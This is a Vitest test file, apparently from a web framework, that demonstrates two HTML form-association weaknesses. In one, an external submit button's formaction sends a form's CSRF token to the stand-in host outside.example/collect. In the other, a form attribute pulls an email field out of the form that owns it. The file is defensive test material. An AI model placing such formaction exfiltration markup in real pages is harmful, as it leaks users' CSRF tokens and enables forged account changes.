import { afterEach, expect, it } from 'vitest';

const initialBody = document.body.innerHTML;

afterEach(() => {
  document.body.innerHTML = initialBody;
});

it('shows that an external component submitter can send a typed form CSRF token off-origin', () => {
  document.body.innerHTML = `
    <form id="account-save" action="/_m/account/save" method="post" data-mutation="account/save">
      <input type="hidden" name="kovo-csrf" value="victim-token">
    </form>
    <button
      id="external-component-submit"
      form="account-save"
      formaction="https://outside.example/collect"
      formmethod="post"
      name="intent"
      value="exfiltrate"
    >Send</button>
  `;

  const form = document.querySelector<HTMLFormElement>('#account-save');
  const submitter = document.querySelector<HTMLButtonElement>('#external-component-submit');
  if (!form || !submitter) throw new Error('missing external form-association fixture');

  expect(submitter.form).toBe(form);
  expect(submitter.formAction).toBe('https://outside.example/collect');
  expect(submitter.formMethod).toBe('post');
  expect(new FormData(form, submitter).get('kovo-csrf')).toBe('victim-token');
});

it('shows that a component-rendered form attribute removes a field from the typed owner', () => {
  document.body.innerHTML = `
    <form id="other" action="/preview" method="get"></form>
    <form id="account-save" action="/_m/account/save" method="post" data-mutation="account/save">
      <input id="reassociated" form="other" name="email" value="attacker@example.test">
    </form>
  `;

  const typed = document.querySelector<HTMLFormElement>('#account-save');
  const other = document.querySelector<HTMLFormElement>('#other');
  const input = document.querySelector<HTMLInputElement>('#reassociated');
  if (!typed || !other || !input) throw new Error('missing reassociated field fixture');

  expect(input.form).toBe(other);
  expect(new FormData(typed).has('email')).toBe(false);
  expect(new FormData(other).get('email')).toBe('attacker@example.test');
});
